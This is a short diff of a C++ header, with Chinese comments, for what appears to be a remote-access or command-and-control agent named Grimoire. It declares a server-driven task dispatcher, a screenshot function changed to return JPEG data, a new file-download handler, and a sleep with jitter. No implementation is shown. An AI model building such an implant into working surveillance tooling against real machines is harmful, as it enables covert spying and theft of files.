@@ -44,6 +44,9 @@ namespace Grimoire::Agent {
 
         // --- 任务处理函数 ---
 
+
+
+
         /**
          * @brief 核心任务调度器，根据服务器任务类型进行分发。
          */
@@ -58,9 +61,14 @@ namespace Grimoire::Agent {
 
         /**
          * @brief 截屏任务。
-         * @return 原始 BMP/PNG 数据的字节数组。
+         * @return 压缩成jpg数据的字节数组。
          */
-        std::vector<unsigned char> TakeScreenshot();
+        std::string TakeScreenshot();
+
+        /**
+         * @brief 下载文件逻辑
+         */
+        std::string HandleDownload(const std::string& filePath);
 
         /**
          * @brief 计算并执行带抖动 (Jitter) 的休眠。
